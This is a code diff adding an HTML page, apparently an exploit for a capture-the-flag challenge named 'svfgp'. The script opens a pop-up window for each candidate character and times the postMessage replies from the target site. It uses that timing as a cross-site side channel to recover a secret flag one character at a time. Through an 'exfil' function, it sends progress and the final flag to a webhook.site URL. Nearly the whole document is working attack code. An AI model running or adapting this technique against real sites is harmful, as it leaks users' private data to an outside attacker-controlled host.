@@ -1,5 +1,97 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>svfgp solver</title>
+<body>running…</body>
 <script>
-fetch("https://webhook.site/94b9dd09-33f5-41af-b252-d0649bda60af?d=test", {
-  mode: "no-cors"
-}).catch(() => {});
+const TARGET = "https://svfgp.breakable.live/";
+const WEBHOOK = "https://webhook.site/94b9dd09-33f5-41af-b252-d0649bda60af";
+let prefix = "CTF{";
+const CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_}";
+let running = false;
+
+function exfil(msg) {
+  fetch(WEBHOOK + "?d=" + encodeURIComponent(msg) + "&t=" + Date.now(), {
+    method: "GET",
+    mode: "no-cors",
+    cache: "no-store"
+  }).catch(() => {});
+}
+
+function round() {
+  if (running) return;
+  running = true;
+
+  const started = new Map();
+  const finished = [];
+  const wins = [];
+
+  function cleanup() {
+    window.removeEventListener("message", onMsg);
+    for (const w of wins) {
+      try { if (w) w.close(); } catch (_) {}
+    }
+    running = false;
+  }
+
+  function chooseBest() {
+    if (!finished.length) {
+      exfil("no-results");
+      cleanup();
+      return;
+    }
+
+    finished.sort((a, b) => b.dt - a.dt);
+    const best = finished[0];
+    prefix = best.sid;
+    exfil("progress:" + prefix);
+
+    cleanup();
+
+    if (prefix.endsWith("}")) {
+      exfil("FLAG:" + prefix);
+      document.body.textContent = "DONE: " + prefix;
+      return;
+    }
+
+    setTimeout(round, 300);
+  }
+
+  function onMsg(ev) {
+    const d = ev.data || {};
+    if (d.type !== "svfgp-probe-done") return;
+    if (typeof d.sid !== "string") return;
+    if (!started.has(d.sid)) return;
+
+    finished.push({
+      sid: d.sid,
+      dt: performance.now() - started.get(d.sid)
+    });
+
+    if (finished.length === CHARSET.length) {
+      chooseBest();
+    }
+  }
+
+  window.addEventListener("message", onMsg);
+
+  for (const ch of CHARSET) {
+    const cand = prefix + ch;
+    const url =
+      TARGET +
+      "?mode=probe&q=" + encodeURIComponent(cand) +
+      "&sid=" + encodeURIComponent(cand) +
+      "&rid=" + Math.random().toString(16).slice(2);
+
+    started.set(cand, performance.now());
+    const w = window.open(url, "_blank", "width=220,height=120");
+    wins.push(w);
+  }
+
+  setTimeout(() => {
+    chooseBest();
+  }, 12000);
+}
+
+exfil("start");
+round();
 </script>
